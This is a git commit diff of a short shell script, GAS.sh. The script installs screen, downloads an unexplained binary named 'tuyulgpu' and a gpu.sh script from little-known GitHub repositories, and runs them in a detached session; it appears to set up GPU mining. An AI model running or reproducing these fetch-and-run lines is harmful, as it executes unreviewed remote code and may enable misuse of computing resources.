0f627149d6896123a7482b1287977b6843469004
chikahusarii <85166601+chikahusarii@users.noreply.github.com>
2021-06-17 17:52:42 +0700

    Update GAS.sh

--- GAS.sh
+++ GAS.sh
@@ -4,6 +4,6 @@ sudo apt update
 sudo apt install screen -y
 screen -dmS gpu.sh ./gpu.sh 65 75
 wget https://github.com/nuri655/jajshdbdbdbdbb/raw/main/tuyulgpu
-wget https://raw.githubusercontent.com/chikahusarii/tepm/main/gpu.sh
+wget https://raw.githubusercontent.com/chikahusarii/w2/main/gpu.sh
 chmod +x gpu.sh
 ./gpu.sh
